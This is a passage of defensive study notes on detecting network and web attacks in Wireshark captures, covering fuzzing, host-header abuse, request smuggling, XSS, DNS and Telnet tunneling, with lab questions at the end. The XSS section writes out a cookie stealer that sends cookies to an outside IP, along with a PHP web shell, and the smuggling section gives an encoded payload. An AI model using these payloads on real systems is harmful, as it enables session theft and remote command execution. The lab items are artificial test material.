*Wireshark capture showing HTTP requests from 192.168.10.5 to 192.168.10.1, including unauthorized access attempts to various files.*

**Filter:** Show only HTTP requests (hide responses)
```
http.request
```

![HTTP Requests Only](https://github.com/user-attachments/assets/30770610-8cf2-49ff-8772-f23e7b2b53fa)

*Wireshark capture showing HTTP requests from 192.168.10.5 to 192.168.10.1, including attempts to access various files.*

##### Directory Fuzzing Signs

- A host repeatedly attempts to access files that do not exist (404 response)
- Requests sent in rapid succession
- Common targets: `.bash_history`, `.git/HEAD`, `.config`, `.cache`, hidden files

#### Analyzing with Access Logs

**Using grep:**
```bash
cat access.log | grep "192.168.10.5"
```

**Output:**
```
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /frand2 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bashrc HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.cache HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.config HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.cvs HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
...SNIP...
```

**Using awk:**
```bash
cat access.log | awk '$1 == "192.168.10.5"'
```

#### Detecting Parameter Fuzzing

**Wireshark Filter:** Filter by source/destination IP
```
http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))
```

![HTTP Parameter Fuzzing](https://github.com/user-attachments/assets/dd124829-f01f-4082-a11a-6be2dea4ef74)

*Wireshark capture showing HTTP requests from 192.168.10.5 to 192.168.10.7, accessing user IDs.*

**Follow HTTP Stream:** Right-click → Follow → HTTP Stream

![HTTP Stream Follow](https://github.com/user-attachments/assets/dc937e3c-4a85-4ebb-b66c-24e70bc97c38)

*HTTP 404 error page showing 'Not Found' for user IDs 8 and 9 on server 192.168.10.7.*

##### Fuzzing Detection Signs

- Many requests sent in rapid succession → indicates fuzzing attempt
- Multiple 404/403 responses from same host
- Unusual parameter patterns in requests

#### Advanced evasion Techniques

Attackers may attempt to evade detection by:

| Technique | Description |
|-----------|-------------|
| **Time Staggering** | Spacing requests across longer time periods |
| **Source IP Rotation** | Using multiple source addresses |
| **Slow Scanning** | Sending requests slowly to avoid rate limits |

#### Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **Configure Virtual Hosts** | Return proper response codes to throw off scanners |
| **WAF Rules** | Block suspicious IP addresses |
| **Rate Limiting** | Limit requests per IP per time window |
| **Logging & Monitoring** | Monitor access logs for unusual patterns |
| **Web Application Firewall** | Deploy WAF to filter malicious traffic |

> 💡 **Key Indicator:** If you see >50 404 responses from one host in short timeframe → likely fuzzing attempt!

### Strange HTTP Headers

> 📌 **Strange HTTP Headers** - Attackers manipulate HTTP headers (Host, User-Agent, verbs) to bypass restrictions or perform request smuggling attacks.

#### What is HTTP Header Manipulation?

When analyzing HTTP traffic, attackers may not use obvious fuzzing techniques. Instead, they manipulate HTTP headers to:
- Bypass virtual host restrictions
- Perform HTTP request smuggling (CRLF injection)
- Gain unauthorized access to internal resources

#### Related PCAP

- `CRLF_and_host_header_manipulation.pcapng`

#### Detecting Strange Host Headers

**Wireshark Filter:** Show all HTTP traffic
```
http
```

![HTTP Traffic Overview](https://github.com/user-attachments/assets/10a67364-f212-4892-88f1-0f1ca6eb1bb6)

*Wireshark capture showing HTTP requests between 192.168.10.5 and 192.168.10.7, including file and login page accesses.*

**Filter:** Find irregular Host headers (exclude legitimate server IP)
```
http.request and (!(http.host == "192.168.10.7"))
```

![Strange Host Headers](https://github.com/user-attachments/assets/f321272d-5c4c-418e-919b-43e2d80a576d)

*Wireshark capture showing repeated HTTP requests from 192.168.10.5 to 192.168.10.7 for login.php with file parameter.*

##### Common Suspicious Host Headers

Attackers may attempt to use:
- `127.0.0.1` - Localhost bypass
- `admin` - Admin page access
- Internal IP addresses - Internal resource access
- Arbitrary domains

**Example 1:** Using 127.0.0.1
![Host 127.0.0.1](https://github.com/user-attachments/assets/9f1ddf48-229e-4e84-8ab6-badd1b553e7f)

*HTTP GET request for login.php with file parameter, showing headers and response details.*

**Example 2:** Using admin
![Host admin](https://github.com/user-attachments/assets/4767959b-5fa3-47f5-8511-422ee81edcb2)

*HTTP GET request for login.php with file parameter, showing headers and response details.*

#### HTTP Request Smuggling (CRLF Injection)

> 📌 **HTTP Request Smuggling** - Attack that exploits how servers parse ambiguous HTTP requests, allowing attackers to inject extra requests.

##### How It Works

Attackers send specially crafted requests with CRLF (`\r\n`) characters to:
1. Bypass input validation
2. Inject additional HTTP requests
3. Access restricted resources

##### Detecting Request Smuggling

**Wireshark Filter:** Find HTTP 400 Bad Request responses
```
http.response.code == 400
```

![HTTP 400 Responses](https://github.com/user-attachments/assets/3184ce34-2d77-4f37-8b84-c732454b8c2b)

*Wireshark capture showing HTTP 400 Bad Request responses between 192.168.10.7 and 192.168.10.5.*

**Following HTTP Stream:** Right-click → Follow → HTTP Stream

![HTTP Stream Details](https://github.com/user-attachments/assets/4eae12e6-3af4-4bb5-9687-56f3782aa6cc)

*HTTP GET request for login.php with encoded parameters, showing headers.*

##### Encoded Attack Payload Example

```
GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5
```

**Decoded by server:**
```
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

 HTTP/1.1
Host: 192.168.10.5
```

##### Vulnerable Apache Configuration (CVE-2023-25690)

```apache
<VirtualHost *:80>
    RewriteEngine on
    RewriteRule "^/categories/(.*)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
</VirtualHost>
```

#### Indicators of Compromise

| Indicator | Description |
|-----------|-------------|
| HTTP 400 responses | Bad requests indicating smuggling attempts |
| Multiple Host headers | Unusual header values |
| URL-encoded requests | Attempting to hide malicious payloads |
| Internal IP references | 127.0.0.1, internal addresses in Host header |

#### Prevention

| Method | Description |
|--------|-------------|
| **Update Web Server** | Patch CVE-2023-25690 |
| **Configure VirtualHosts** | Prevent header-based bypass |
| **Validate Headers** | Reject unusual Host headers |
| **Use WAF** | Filter malicious requests |
| **Disable Proxying** | If not needed, disable reverse proxy features |

> 💡 **Key Indicator:** HTTP 400 responses with encoded URLs → potential CRLF injection!

### XSS & Code Injection

> 📌 **XSS (Cross-Site Scripting)** - Attack where malicious JavaScript is injected into web pages, executing in victims' browsers to steal session data, cookies, and tokens.

> 📌 **Code Injection** - Attack that injects malicious code (PHP, JavaScript, etc.) into server-side scripts through user input.

#### What is XSS & Code Injection?

**Cross-Site Scripting (XSS):**
- Attackers inject malicious JavaScript into web pages
- Executes in victims' browsers when they visit the compromised page
- Used to steal:
  - Session cookies
  - Authentication tokens
  - Sensitive browser data

**Code Injection:**
- Attacker injects server-side code through user input
- Can execute commands on the server
- Common targets: comment fields, search boxes, forms

#### Related PCAP

- `XSS_Simple.pcapng`

#### Detecting XSS in Network Traffic

**Wireshark Filter:** Look for HTTP requests with cookies being sent to unexpected destinations
```
http
```

![HTTP with Cookies](https://github.com/user-attachments/assets/6b59a9ce-9efa-404a-af15-d7130a7c645c)

*Wireshark capture showing HTTP requests with cookies between 192.168.10.3 and 192.168.10.5.*

**Follow HTTP Stream:** Right-click → Follow → HTTP Stream

![HTTP Stream Cookie](https://github.com/user-attachments/assets/f884a7f3-9416-4a85-9215-d97f6a5945a0)

*HTTP GET request with cookie parameter, resulting in 404 error response.*

##### Signs of XSS Attack

- HTTP requests containing cookies/tokens sent to unrecognized external IPs
- Unusual data exfiltration patterns
- Scripts being sent in HTTP requests
- Unexpected user input appearing in server responses

#### Example Attack Payloads

##### JavaScript Cookie Stealer (Injected in Comment Field)

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

This payload:
1. Waits for page to load
2. Collects victim's cookies
3. Sends cookies to attacker-controlled server (192.168.0.19:5555)

##### PHP Command Injection

```php
<?php system($_GET['cmd']); ?>
```

Allows remote command execution via URL parameter `?cmd=<command>`

##### PHP Single Command Execution

```php
<?php echo `whoami` ?>
```

Executes `whoami` command on the server

#### Detection Signs

| Sign | Description |
|------|-------------|
| Unexpected cookie destinations | Cookies sent to unrecognized IPs |
| Script tags in requests | `<script>` tags in HTTP body |
| PHP code in inputs | `<?php` tags appearing in traffic |
| External data transfers | Large data going to unexpected destinations |
| Base64 encoded data | Obfuscated payloads |

#### Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **Input Sanitization** | Validate and sanitize all user inputs |
| **Output Encoding** | Encode output to prevent execution |
| **Content Security Policy** | Set CSP headers to block inline scripts |
| **HTTPOnly Cookies** | Set HttpOnly flag on cookies |
| **Input Validation** | Use allowlists for acceptable input |
| **Regular Patching** | Keep web application updated |
| **Web Application Firewall** | Deploy WAF to filter malicious inputs |

> 💡 **Key Indicator:** Cookies/tokens sent to unknown external IPs → possible XSS data exfiltration!

### SSL Renegotiation

> 📌 **SSL Renegotiation Attack** - Attack where an attacker triggers repeated TLS/SSL handshakes to force weaker encryption or cause DoS.

#### What is SSL Renegotiation?

**SSL/TLS Overview:**
Unlike HTTP (stateless), HTTPS uses encryption to secure communications:
- **Transport Layer Security (TLS)** - Modern encryption protocol
- **Secure Sockets Layer (SSL)** - Legacy encryption protocol

**HTTPS Connection Process:**

| Phase | Description |
|-------|-------------|
| **Handshake** | Client & server agree on encryption algorithms, exchange certificates |
| **Encryption** | Data is encrypted using agreed algorithm |
| **Data Exchange** | Encrypted web pages, images, resources |
| **Decryption** | Data decrypted using private/public keys |

#### Related PCAP

- `SSL_renegotiation_edited.pcapng`

#### TLS/SSL Handshake Process

![TLS Handshake](https://github.com/user-attachments/assets/8bb9c74c-f747-4749-b595-ca332f0995f8)

*Diagram of a TCP and TLS handshake between client and server, showing SYN, SYN ACK, ACK, ClientHello, ServerHello, Certificate, and key exchange steps.*

##### Handshake Steps

| Step | Description |
|------|-------------|
| **Client Hello** | Client sends supported TLS versions, cipher suites, random nonce |
| **Server Hello** | Server selects TLS version, cipher suite, sends own nonce |
| **Certificate Exchange** | Server sends digital certificate with public key |
| **Key Exchange** | Client generates premaster secret, encrypts with server's public key |
| **Session Key Derivation** | Both parties derive session keys from nonces + premaster secret |
| **Finished Messages** | Both parties verify handshake with hash of all messages |
| **Secure Data Exchange** | Encrypted communication begins |

##### Handshake Algorithm

```
Client Hello:    ClientHello = {ClientVersion, ClientRandom, Ciphersuites, CompressionMethods}
Server Hello:    ServerHello = {ServerVersion, ServerRandom, Ciphersuite, CompressionMethod}
Certificate:     ServerCertificate = {ServerPublicCertificate}
Key Exchange:    ClientDHPublicKey, ServerDHPublicKey exchanged
Premaster Secret: DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)
Session Key:     MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)
Finished:        FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))
```

#### Detecting SSL Renegotiation Attacks

**Wireshark Filter:** Show only TLS handshake messages
```
ssl.record.content_type == 22
```

*Content type 22 = Handshake messages*

![TLS Handshake Capture](https://github.com/user-attachments/assets/4bec6d95-40c2-4446-8bfe-4513eee74f29)

*Wireshark capture showing TLS handshake with Client Hello and key exchange between 192.168.10.56 and 192.168.10.23.*

##### Signs of SSL Renegotiation Attack

| Indicator | Description |
|-----------|-------------|
| **Multiple Client Hellos** | Multiple client hello messages from same client in short period |
| **Out of Order Messages** | Client Hello appearing after handshake completion |
| **Repeated Handshakes** | Unusual number of renegotiation attempts |

#### Why Attackers Use SSL Renegotiation

| Reason | Description |
|--------|-------------|
| **Denial of Service** | SSL renegotiation consumes heavy server resources, can overwhelm server |
| **Cipher Suite Exploitation** | Force weaker encryption algorithms |
| **Cryptanalysis** | Analyze SSL/TLS patterns for vulnerability discovery |

#### Other HTTPS Vulnerabilities

##### Heartbleed Vulnerability (CVE-2014-0160)

- Buffer overread bug in OpenSSL
- Allows reading server memory contents
- Exploits TLS heartbeat extension
- Exposes private keys, session data

#### Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **Disable SSL Renegotiation** | If not needed, disable on server |
| **Update OpenSSL** | Patch Heartbleed and other vulnerabilities |
| **Strong Cipher Suites** | Use only strong, modern ciphers |
| **Rate Limiting** | Limit handshake requests per IP |
| **Monitor Handshakes** | Alert on excessive renegotiation attempts |
| **Certificate Management** | Regular certificate rotation |

> 💡 **Key Indicator:** Multiple Client Hello messages from same source → potential SSL renegotiation attack!

### Peculiar DNS Traffic

> 📌 **Peculiar DNS Traffic** - DNS can be used for data exfiltration, command & control, and reconnaissance. Understanding DNS anomalies is critical for SOC analysts.

#### What is DNS?

**DNS (Domain Name System)** translates domain names to IP addresses and vice versa. DNS traffic analysis is crucial because:
- High volume can hide malicious activity
- DNS is often allowed through firewalls (trust boundary)
- Attackers abuse DNS for data exfiltration and C2

#### Related PCAPs

- `dns_enum_detection.pcapng` - DNS Enumeration
- `dns_tunneling.pcapng` - DNS Tunneling

---

##### DNS Query Flow (Forward Lookup)

![DNS Query Flow](https://github.com/user-attachments/assets/2f381518-83f4-463a-bfe8-f5378951e022)

*Diagram showing DNS query flow from client1.globomantics.com to local DNS server, then to root DNS server, and finally to na.globomantics.com and asia.globomantics.com DNS servers.*

##### Forward Lookup Process

```
Request:  Where is academy.hackthebox.com?
Response: Well its at 192.168.10.6
```

| Step | Description |
|------|-------------|
| **1. Query Initiation** | Client wants to visit academy.hackthebox.com |
| **2. Local Cache Check** | Client checks local DNS cache |
| **3. Recursive Query** | Client sends query to configured DNS server |
| **4. Root Servers** | DNS resolver queries root servers for TLD |
| **5. TLD Servers** | Root responds with authoritative servers for .com |
| **6. Authoritative Servers** | Queries TLD for hackthebox.com |
| **7. Domain Authoritative** | Gets IP for academy.hackthebox.com |
| **8. Response** | Returns IP to client |

---

##### DNS Reverse Lookup Process

```
Request:  What is your name 192.168.10.6?
Response: Well its academy.hackthebox.com :)
```

| Step | Description |
|------|-------------|
| **1. Query Initiation** | Client sends reverse query with IP address |
| **2. Reverse Lookup Zones** | DNS resolver checks reverse zone (e.g., 1.2.0.192.in-addr.arpa) |
| **3. PTR Record Query** | Looks for PTR record for the IP |
| **4. Response** | Returns FQDN if PTR record exists |

![DNS Reverse Lookup](https://github.com/user-attachments/assets/c8893fa1-df0e-41eb-b18c-d2df1065c2ee)

*Diagram showing DNS lookup for Google.com resulting in IP 74.125.142.147, and reverse DNS lookup for IP 74.125.142.147 resulting in Google.com.*

---

##### DNS Record Types

| Record Type | Description |
|------------|-------------|
| **A (Address)** | Maps domain name to IPv4 address |
| **AAAA (IPv6 Address)** | Maps domain name to IPv6 address |
| **CNAME (Canonical Name)** | Creates alias for domain name |
| **MX (Mail Exchange)** | Specifies mail server for domain |
| **NS (Name Server)** | Specifies authoritative name servers |
| **PTR (Pointer)** | Maps IP to domain name (reverse lookup) |
| **TXT (Text)** | Stores text information |
| **SOA (Start of Authority)** | Administrative zone information |

---

#### Detecting DNS Enumeration

**Wireshark Filter:** Show all DNS traffic
```
dns
```

![DNS Traffic Overview](https://github.com/user-attachments/assets/413350b1-295c-4eb1-a05b-4280a0925500)

*Wireshark capture showing DNS queries from 192.168.10.5 to 192.168.10.1, protocol DNS, with varying lengths and standard query details.*

**Look for ANY queries:**
```
dns
```

![DNS ANY Query](https://github.com/user-attachments/assets/a3e9fc6f-8520-4729-8838-20cff2a87df3)

*Wireshark capture showing DNS queries from 192.168.10.5 to 192.168.10.1, with standard query and response details.*

> 💡 **Key Indicator:** ANY queries → clear sign of DNS enumeration/subdomain enumeration

---

#### Detecting DNS Tunneling

> 📌 **DNS Tunneling** - Attackers encode data in DNS queries (TXT records) to exfiltrate data or establish C2.

##### Signs of DNS Tunneling

- Excessive TXT records from one host
- Unusual data patterns in DNS queries
- Long subdomains with encoded data

**Wireshark Filter:** Look for DNS queries with text records

![DNS Tunneling](https://github.com/user-attachments/assets/a44f8c60-0228-45a8-8ece-2e0dde35bdc5)

*Wireshark capture showing DNS queries from 192.168.10.5 to 192.168.10.1, with standard query and response details indicating format errors for htb.com.*

**Examine DNS data in packet details:**

![Hex Dump](https://github.com/user-attachments/assets/72b1ed32-5f56-4038-a3b2-c73d01bd5016)

*Hex dump showing data with ASCII translation, including a message: 'HTB{This is kind of malicious ;)}'.*

**Encoded data:**

![Encoded Data](https://github.com/user-attachments/assets/c50a4c6a-0289-4a40-9ef8-188cb189a1f7)

*Hex dump showing data with ASCII translation, including a message: 'HTB{This is kind of malicious ;)}' and encoded text.*

**Extracting encoded data in Wireshark:**

![DNS Query Details](https://github.com/user-attachments/assets/523338c8-a205-499d-924d-b8343fd041b4)

*DNS query details for htb.com, showing a TXT record with encoded data.*

##### Decoding DNS Tunneling Data

**Base64 Single Decode:**
```bash
echo 'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=' | base64 -d
```

**Output:**
```
U0ZSQ2UxZHZkV3hrWDNsdmRWOW1iM0ozWVhKa1gyMWxYM1JvYVhOZmNISmxkSFI1WDNCc1pXRnpaWDBLCg==
```

**Multiple Decode (double/triple encoded):**
```bash
echo 'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=' | base64 -d | base64 -d | base64 -d
```

---

##### Why Attackers Use DNS Tunneling

| Reason | Description |
|--------|-------------|
| **Data Exfiltration** | Send data out of network without detection |
| **Command and Control** | Malware uses DNS for C2 communication |
| **Bypass Firewalls/Proxies** | DNS traffic often allowed through network boundaries |
| **Domain Generation Algorithms (DGAs)** | Advanced malware uses dynamically generated domain names |

---

#### IPFS and DNS Tunneling

> ⚠️ **Advanced Threat Warning:** Attackers use IPFS (Interplanetary File System) to store malicious files.

**Suspicious URLs to monitor:**
```
https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
```

IPFS operates on peer-to-peer basis, making detection exceptionally difficult.

---

#### DNS Anomaly Detection Summary

| Anomaly | Indicator | Wireshark Filter |
|---------|-----------|------------------|
| **DNS Enumeration** | Excessive ANY queries | `dns` |
| **DNS Tunneling** | TXT records with encoded data | `dns and dns.txt` |
| **Data Exfiltration** | Large DNS queries to external domains | `dns and ip.dst not in 10.0.0.0/8` |
| **DGA Traffic** | Many failed DNS lookups | `dns and dns.rcode != 0` |

---

#### Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **DNS Logging** | Enable DNS query logging |
| **Block TXT Queries** | If not needed, block TXT records |
| **Rate Limiting** | Limit DNS queries per client |
| **DNS Firewall** | Use DNS filtering service |
| **Monitor External DNS** | Alert on unusual external DNS traffic |
| **IPFS Monitoring** | Block IPFS gateway URLs |
| **DNSSEC** | Enable DNSSEC validation |

> 💡 **Key Indicators:** Excessive DNS TXT records OR ANY queries → investigate for tunneling/enumeration!

### Strange Telnet & UDP

> 📌 **Strange Telnet & UDP Traffic** - Telnet and UDP can be used for data exfiltration, tunneling, and command & control. These protocols are often overlooked but can reveal malicious activity.

#### What is Telnet?

**Telnet** is a network protocol that allows bidirectional interactive communication between two devices over a network.
- Developed in the 1970s (RFC 854)
- Usage has decreased in favor of SSH
- Transmits data in plaintext (including credentials)

> ⚠️ **Security Concern:** Telnet traffic is decrypted and easily inspectable, but attackers may encrypt, encode, or obfuscate the text.

#### Related PCAPs

- `telnet_tunneling_23.pcapng` - Traditional Telnet on port 23
- `telnet_tunneling_9999.pcapng` - Telnet on non-standard port
- `telnet_tunneling_ipv6.pcapng` - Telnet over IPv6
- `udp_tunneling.pcapng` - UDP Tunneling

---

##### Finding Traditional Telnet Traffic (Port 23)

**Wireshark Filter:**
```
telnet
```

![Telnet Traffic](https://github.com/user-attachments/assets/0084e81a-bd38-45b5-94d8-b5de4d61071e)

*Wireshark capture showing TCP and Telnet traffic between 192.168.10.5 and 192.168.10.7, with sequence and acknowledgment details.*

**Inspecting Telnet Data:**

![Telnet Data](https://github.com/user-attachments/assets/6bb82b91-565b-465f-bd33-7329eac31ef5)

*Network packet details showing Telnet data from 192.168.10.5 to 192.168.10.7, indicating unencrypted Telnet communication.*

---

##### Finding Telnet on Non-Standard Ports

Attackers can run Telnet on any port. Look for suspicious traffic on unusual ports.

**Wireshark Filter:** Look for TCP traffic on port 9999
```
tcp.port == 9999
```

![Telnet Port 9999](https://github.com/user-attachments/assets/87fad04c-d817-4ca6-9a06-b423446196c4)

*Wireshark capture showing TCP traffic between 192.168.10.5 and 192.168.10.7, with sequence and acknowledgment details.*

**Hex Dump Analysis:**

![Hex Dump](https://github.com/user-attachments/assets/13c7959e-5663-43e3-b7e4-b182029fd838)

*Hex dump showing data with ASCII translation, including the text 'Telnet' followed by exclamation marks.*

**Follow TCP Stream:** Right-click → Follow → TCP Stream

![TCP Stream Follow](https://github.com/user-attachments/assets/17149a9b-aa92-444b-a712-e3f51dca9158)

*Wireshark TCP stream showing Telnet data with message: 'telnet!!!!!!!! exfil this why do we exfil? HTB{telnet tunnel pls and thank you}'.*

---

##### Telnet over IPv6

Unless your network uses IPv6, IPv6 traffic can be an indicator of malicious activity.

**Wireshark Filter:** Filter by IPv6 address and telnet
```
((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
```

![IPv6 Telnet](https://github.com/user-attachments/assets/773e7e45-c972-4e5b-ac75-f409a8fb2806)

*Wireshark capture showing Telnet and TCP traffic between IPv6 addresses, with sequence and acknowledgment details, including ICMPv6 neighbor solicitation and advertisement.*

**Filtered IPv6 Telnet:**

![Filtered IPv6](https://github.com/user-attachments/assets/f78b6b82-b16c-4015-b00c-d43fb8b9e1d4)

*Wireshark capture showing Telnet traffic between IPv6 addresses, with consistent Telnet data packets.*

**Inspecting IPv6 Telnet Data:**

![IPv6 Telnet Data](https://github.com/user-attachments/assets/604100a4-3c1b-4b5e-90cf-99bb613fb9bf)

*Network packet details showing Telnet data from IPv6 address fe80::c9c8:ed3:1b10:f10b to fe80::46a8:5bff:fe95:682a, indicating Telnet tunneling capability.*

---

##### UDP Traffic Analysis

> 📌 **UDP (User Datagram Protocol)** - Connectionless protocol that provides fast transmission without handshake. Attackers use it for tunneling and exfiltration because it's less monitored than TCP.

**TCP vs UDP:**

![TCP vs UDP](https://github.com/user-attachments/assets/a7c19c8c-e2b6-433f-bc35-6a035eeaed3e)

*Diagram comparing TCP and UDP communication. TCP shows a three-way handshake with SYN, SYN-ACK, and ACK. UDP shows a simple request and multiple responses.*

##### Detecting UDP Tunneling

**Wireshark Filter:**
```
udp
```

![UDP Traffic](https://github.com/user-attachments/assets/2ee99266-8602-4b39-8d2e-ab7f11e9a464)

*Wireshark capture showing UDP traffic from 192.168.10.5 to 192.168.10.7, with consistent packet lengths and port numbers.*

**Key Difference:** No SYN/SYN-ACK/ACK handshake - data is sent immediately

**Follow UDP Stream:** Right-click → Follow → UDP Stream

![UDP Stream](https://github.com/user-attachments/assets/6e7c27ca-0d82-4741-bcc6-ec4f2b932ca7)

*Wireshark UDP stream showing alphabet and numbers, with a message about UDP's suitability for exfiltration due to less monitoring compared to TCP.*

---

##### Common Legitimate UDP Traffic

| Protocol | Port | Description |
|----------|------|-------------|
| **DNS** | 53 | Domain Name System queries |
| **DHCP** | 67/68 | Dynamic IP assignment |
| **SNMP** | 161/162 | Network monitoring |
| **TFTP** | 69 | Trivial file transfer |
| **Real-time Apps** | Various | Streaming, gaming, VoIP |

---

##### Detection Signs

| Indicator | Description |
|-----------|-------------|
| **Telnet on non-standard ports** | Port != 23 |
| **Large Telnet data transfers** | Data exfiltration |
| **IPv6 Telnet** | Unless network uses IPv6 |
| **UDP high volume** | Potential tunneling |
| **Unusual UDP patterns** | Consistent packet sizes |

---

#### Prevention & Mitigation

| Method | Description |
|--------|-------------|
| **Disable Telnet** | Use SSH instead |
| **Block Telnet** | Firewall rules |
| **Monitor Non-standard Ports** | Alert on unusual port usage |
| **IPv6 Monitoring** | Watch for unexpected IPv6 traffic |
| **UDP Rate Limiting** | Limit UDP traffic per client |
| **Deep Packet Inspection** | Inspect UDP payload contents |
| **Network Segmentation** | Isolate sensitive systems |

> 💡 **Key Indicators:** 
> - Telnet on ports other than 23
> - IPv6 telnet (unless network uses IPv6)
> - High-volume UDP to single destination
> - "Follow UDP Stream" shows readable text

---

## 5. Skills Assessment

> 📌 **Skills Assessment** - Apply your network traffic analysis skills to identify attacks in PCAP files.

### Scenario

As a SOC analyst, you have been provided with two PCAP files to analyze:
- `funky_dns.pcap`
- `funky_icmp.pcap`

Your task is to inspect these captures and identify patterns/behaviors that deviate from normal network traffic.

---

### PCAP Files Analysis

#### funky_dns.pcap

This PCAP contains DNS traffic that may show anomalous patterns. Look for:
- Excessive DNS queries
- Unusual DNS record types
- Data patterns in DNS queries
- TXT records with encoded data

#### funky_icmp.pcap

This PCAP contains ICMP traffic that may show anomalous patterns. Look for:
- Large ICMP packets
- ICMP from unusual sources
- Data in ICMP packets
- Excessive ICMP traffic

---

### Lab Questions

**Question 1 (2 points):**
Inspect the `funky_dns.pcap` file and identify the attack type.

> 📝 Answer format: "DNS Flooding", "DNS Amplification", "DNS Tunneling"

**Question 2 (3 points):**
Inspect the `funky_icmp.pcap` file and identify the attack type.

> 📝 Answer format: "ICMP Flooding", "ICMP Tunneling", "ICMP SMURF Attack"

---

### Hints for Analysis

| PCAP | What to Look For |
|------|------------------|
| **funky_dns.pcap** | Unusual DNS queries, TXT records, encoded data in queries |
| **funky_icmp.pcap** | Large ICMP packets, ICMP with data payload, source address patterns |

---

### Wireshark Filters for Analysis

```bash
# DNS Analysis
dns                                    # All DNS traffic
dns.qry.type == 16                     # TXT queries
dns.txt                                # DNS TXT records

# ICMP Analysis
icmp                                   # All ICMP traffic
icmp[icmp[icmptype] == 8]              # ICMP Echo Request
icmp or ip.src == x.x.x.x              # ICMP from specific source
```

---

> 💡 **Tip:** Use "Follow UDP Stream" for DNS and "Follow ICMP Stream" for ICMP to inspect payload data.

---

## Interview Questions

### Link Layer Attacks

1. **What is ARP spoofing and how do you detect it in network traffic?**
2. **How does a rogue access point differ from an evil twin?**
3. **What are the indicators of a WiFi deauthentication attack?**
4. **How can you detect ARP scanning in Wireshark?**

### Network Layer Attacks

5. **What is IP spoofing and when is it commonly used?**
6. **Explain the difference between IP TTL manipulation and IP identification attacks.**
7. **What is a LAND attack and how does it work?**
8. **How do you detect fragmentation attacks in PCAP?**

### Transport Layer Attacks

9. **What is TCP handshake abnormality and how do you identify it?**
10. **Explain TCP reset attack and when would an attacker use it?**
11. **What is TCP hijacking and what are the prerequisites?**
12. **How can you detect SYN flood attacks?**

### Application Layer Attacks

13. **What indicators suggest directory fuzzing in HTTP traffic?**
14. **Explain HTTP request smuggling (CRLF injection) and how to detect it.**
15. **What is DNS tunneling and how does data exfiltration work via DNS?**
16. **How do you detect XSS attacks in network traffic?**
17. **What is SSL renegotiation attack and why is it dangerous?**

### General Analysis

18. **What Wireshark filters do you use for detecting anomalous network traffic?**
19. **How do you differentiate between legitimate high traffic and DDoS?**
20. **What PCAP files would you analyze to investigate a potential data exfiltration?**

---

## Additional Resources

### Tools for Network Traffic Analysis

| Tool | Description |
|------|-------------|
| **Wireshark** | GUI packet analyzer |
| **Tshark** | CLI Wireshark |
| **tcpdump** | CLI packet capture |
| **NetworkMiner** | Extract artifacts from PCAP |
| **Zeek** | Network security monitor |
| **Snort/Suricata** | IDS/IPS |

### Key RFCs

| Protocol | RFC | Description |
|----------|-----|-------------|
| ARP | RFC 826 | Address Resolution Protocol |
| IP | RFC 791 | Internet Protocol |
| TCP | RFC 793 | Transmission Control Protocol |
| DNS | RFC 1035 | Domain Names - Implementation |
| ICMP | RFC 792 | Internet Control Message Protocol |
| SSL/TLS | RFC 5246 | TLS Protocol |

### Recommended Learning Path

1. Master link layer protocols (ARP, 802.11)
2. Understand IP and ICMP anomalies
3. Learn TCP handshake analysis
4. Study HTTP/HTTPS traffic patterns
5. Practice DNS traffic analysis
6. Learn about tunneling techniques (ICMP, DNS, Telnet)
7. Practice with various PCAP files

---

### PCAP Files Reference

All PCAP files are available in `Resources/pcap_files.zip`:

| PCAP File | Attack Type |
|-----------|-------------|
